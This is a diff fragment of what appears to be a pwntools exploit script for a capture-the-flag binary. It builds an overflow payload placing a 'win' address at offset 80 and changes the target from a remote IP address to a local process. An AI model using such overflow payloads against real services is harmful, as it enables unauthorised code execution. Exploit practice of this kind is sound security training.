@@ -9,7 +9,7 @@ payload = fit({
     80: winaddr
 })
 
-io = remote('34.134.173.142', 5000)
+io = exe.process() #remote('34.134.173.142', 5000)
 
 io.sendline(payload)
 
